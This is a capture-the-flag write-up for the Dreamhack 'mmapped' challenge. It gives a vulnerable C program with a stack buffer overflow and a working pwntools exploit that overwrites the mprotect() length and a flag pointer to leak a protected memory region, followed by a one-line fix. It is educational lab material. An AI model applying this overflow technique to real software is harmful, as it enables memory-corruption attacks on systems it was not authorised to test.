---
title: "[Dreamhack] mmapped - Write up"
date: 2024-01-17 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, mmap, mprotect, stack-overflow, dreamhack]
author: datious
---
[Write up for Dreamhack]__Challenge: **mmapped**      | Author: datious

Today I will solve a challenge that relate to memory protection. Below is the program.

chall.c
```
// Name: chall.c
// Compile: gcc -fno-stack-protector chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define FLAG_SIZE 0x45

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main(int argc, char *argv[]) {
    int len;
    char * fake_flag_addr;
    char buf[0x20];
    int fd;
    char * real_flag_addr;

    initialize();

    fd = open("./flag", O_RDONLY);
    len = FLAG_SIZE;
    fake_flag_addr = "DH{****************************************************************}";

    printf("fake flag address: %p\n", fake_flag_addr);
    printf("buf address: %p\n", buf);

    real_flag_addr = (char *)mmap(NULL, FLAG_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    printf("real flag address (mmapped address): %p\n", real_flag_addr);

    printf("%s", "input: ");
    read(0, buf, 60);

    mprotect(real_flag_addr, len, PROT_NONE);

    write(1, fake_flag_addr, FLAG_SIZE);
    printf("\nbuf value: ");
    puts(buf);

    munmap(real_flag_addr, FLAG_SIZE);
    close(fd);

    return 0;
}
```

So we can see that the program provides with three addresses involved: fake_flag_addr, real_flag_addr and buf.

In the main function we can see that when contents of the flag was read and contained in real_flag_addr. This is the target we need to use to print flag out of the screen.

**Vulnerability**
The vulnerability is a stack-based buffer overflow in the read() call. The buffer has a size of 0x20 (32) bytes, but read() accepts up to 60 bytes of input, allowing an attacker to overwrite data beyond the end of the buffer -> Buffer overflow.

My initial idea was to overwrite the fake_flag_addr with the address of the real_flag_addr. However, the memory region containing the real_flag_addr is protected by mprotect(PROT_NONE), making it inaccessible. Therefore, I decided to analyze the program in GDB to observe the state of the memory before and after the mprotect() call.

![image](https://hackmd.io/_uploads/HyuW56gBGx.png)

You can see that the real_flag_addr locate on top of the fake_flag_addr. What caught my attention was 0x0000000300000045 which I suspect is the length parameter of mprotect().

By overwrite 0x0000000300000045 with 0x0000000300000000, the mprotect() falls to protect the real_flag_addr, allowing us bypass the mprotect().

However, the program still displays a flag. Since it simply prints contents of the fake_flag_addr, we can overwrite fake_flag_addr with the real_flag_addr provided by the program.

**My script**
```#!/usr/bin/python3
from pwn import *
exe=ELF('./chall',checksec=False)
p=process(exe.path)
context.terminal=['konsole','-e']
gdb.attach(p,gdbscript='''
	b*main+239
	''')
p.recvuntil(b'fake flag address: ')
fake=int(p.recvline(),16) #fake to puts -0xc1c
p.recvuntil(b'buf address: ')
buf=int(p.recvline(),16)
p.recvuntil(b'real flag address (mmapped address): ')
real=int(p.recvline(),16)
log.info("fale flag: "+hex(fake))
log.info("real flag: "+hex(real))
log.info("buf: "+hex(buf))
payload=p64(real)
payload+=b'A'*40
payload+=p64(real)
payload+=p32(0)
p.sendlineafter(b'input: ',payload)

p.interactive()
```
**Result**
![image](https://hackmd.io/_uploads/SJjhapeSfl.png)

**How to fix this vulnerability?**

This issue is caised by a developer mistake in nitializing the variable's size. It can be fixed simply by matching the size parameter in read() to the actual size of the variable.

Goodluck!!!